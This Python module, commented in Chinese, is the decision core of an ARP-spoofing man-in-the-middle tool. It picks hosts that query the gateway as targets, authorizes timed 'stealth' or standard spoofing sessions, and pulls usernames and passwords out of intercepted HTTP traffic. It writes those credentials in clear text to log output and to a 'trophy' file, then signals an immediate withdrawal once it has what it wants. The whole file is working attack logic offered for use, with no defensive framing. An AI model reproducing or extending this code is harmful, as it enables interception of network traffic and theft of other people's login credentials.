"""
攻击协调器
==========
根据数据包分析结果制定攻击策略，管理攻击生命周期
"""

import logging
import time
import threading
from dataclasses import dataclass
from typing import Optional, Callable, Dict, Any
from state_cache import StateCache

@dataclass
class AttackDecision:
    """攻击决策"""
    action: str  # 'attack', 'restore', 'ignore'
    target_ip: str
    gateway_ip: str = ""
    target_mac: str = ""
    gateway_mac: str = ""
    duration: int = 45  # 攻击持续时间(秒)
    attack_type: str = "standard"  # 攻击类型
    reason: str = ""  # 决策原因

class AttackCoordinator:
    """攻击协调器"""
    
    def __init__(self, config, state_cache: StateCache):
        self.config = config
        self.state_cache = state_cache
        self.logger = logging.getLogger(__name__)
        self.command_sender = None
        
        # 统计信息
        self.stats = {
            'decisions_made': 0,
            'attacks_authorized': 0,
            'attacks_blocked': 0,
            'restores_initiated': 0
        }
        self.stats_lock = threading.Lock()
        
    def initialize(self, command_sender: Callable) -> bool:
        """初始化协调器"""
        self.command_sender = command_sender
        self.logger.info("Attack coordinator initialized")
        return True
        
    def make_decision(self, analysis_result) -> Optional[AttackDecision]:
        """根据分析结果制定攻击决策"""
        with self.stats_lock:
            self.stats['decisions_made'] += 1
            
        try:
            if analysis_result.packet_type == 'arp':
                return self._handle_arp_analysis(analysis_result)
            elif analysis_result.packet_type == 'http':
                return self._handle_http_analysis(analysis_result)
            else:
                return None
                
        except Exception as e:
            self.logger.error(f"Decision making error: {e}")
            return None
    
    def _handle_arp_analysis(self, analysis) -> Optional[AttackDecision]:
        """处理ARP分析结果"""
        if not analysis.gateway_query:
            return None
            
        target_ip = analysis.source_ip
        
        # 检查是否应该攻击此目标
        if not self.state_cache.should_attack_target(target_ip):
            with self.stats_lock:
                self.stats['attacks_blocked'] += 1
                
            self.logger.debug(f"Attack blocked for {target_ip} (cache hit or active attack)")
            return AttackDecision(
                action='ignore',
                target_ip=target_ip,
                reason='blocked_by_cache'
            )
        
        # 授权攻击
        with self.stats_lock:
            self.stats['attacks_authorized'] += 1
            
        # 获取目标MAC (从缓存或分析结果)
        target_mac = analysis.metadata.get('src_mac', '')
        if not target_mac:
            target_mac = self.state_cache.get_cached_mac(target_ip) or ''
        
        decision = AttackDecision(
            action='attack',
            target_ip=target_ip,
            gateway_ip=self.config.network.gateway_ip,
            target_mac=target_mac,
            gateway_mac='',  # 将在执行时获取
            duration=self.config.attack.attack_timeout,
            attack_type='stealth' if self.config.attack.stealth_mode else 'standard',
            reason='arp_gateway_query'
        )
        
        # 开始攻击会话跟踪
        self.state_cache.start_attack_session(
            target_ip, 
            decision.duration, 
            decision.attack_type
        )
        
        self.logger.info(f"Attack authorized for {target_ip} (ARP gateway query)")
        return decision
    
    def _handle_http_analysis(self, analysis) -> Optional[AttackDecision]:
        """处理HTTP分析结果"""
        target_ip = analysis.source_ip
        
        # 如果捕获到凭据，记录并可能触发恢复
        if analysis.http_credentials:
            self.logger.info(f"🔑 Credentials captured from {target_ip}: "
                           f"{analysis.http_credentials['username']}:"
                           f"{analysis.http_credentials['password']}")
            
            # 保存凭据到文件
            self._save_credentials(target_ip, analysis.http_credentials, analysis.metadata)
            
            # 标记攻击成功
            self.state_cache.end_attack_session(target_ip, success=True)
            
            # 决定是否立即恢复ARP (添加配置检查)
            immediate_restore = getattr(self.config.attack, 'immediate_restore_on_success', True)
            if immediate_restore:
                with self.stats_lock:
                    self.stats['restores_initiated'] += 1
                    
                return AttackDecision(
                    action='restore',
                    target_ip=target_ip,
                    gateway_ip=self.config.network.gateway_ip,
                    reason='credentials_captured'
                )
        
        # 对于普通HTTP流量，不需要特殊处理
        return AttackDecision(
            action='ignore',
            target_ip=target_ip,
            reason='http_traffic_logged'
        )
    
    def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
        """保存捕获的凭据并触发立即撤离"""
        try:
            # 防重复：检查是否已经保存过此用户的凭据
            credential_key = f"{source_ip}:{credentials.get('username', '')}"
            
            # 使用状态缓存检查是否已保存
            if self.state_cache.has_credentials_saved(credential_key):
                self.logger.debug(f"Credentials for {credential_key} already saved, skipping duplicate")
                return
            
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            
            # 格式化保存内容：IP,用户名,密码,时间 (保持原始4字段格式)
            log_entry = f"{source_ip},{credentials['username']},{credentials['password']},{timestamp}\n"
            
            # 保存到临时文件
            trophy_file = "temporary.txt"
            with open(trophy_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
            # 标记已保存，防止重复
            self.state_cache.mark_credentials_saved(credential_key)
            
            self.logger.info(f"🏆 Credentials saved to {trophy_file}: {credentials['username']}@{source_ip}")
            
            # 🚀 新增：发送立即停止攻击命令 (一击脱离)
            stop_command = {
                'type': 'STOP_SPOOF',
                'target_ip': source_ip,
                'reason': 'credentials_captured'
            }
            
            if self.command_sender:
                self.command_sender(stop_command)
                self.logger.info(f"⚡ Immediate withdrawal triggered for {source_ip} - credentials captured!")
            
        except Exception as e:
            self.logger.error(f"Failed to save credentials: {e}")
    
    def get_statistics(self) -> Dict[str, Any]:
        """获取协调器统计信息"""
        with self.stats_lock:
            stats = dict(self.stats)
        
        # 添加状态缓存统计
        cache_stats = self.state_cache.get_statistics()
        stats.update({
            'cache_' + k: v for k, v in cache_stats.items()
        })
        
        return stats
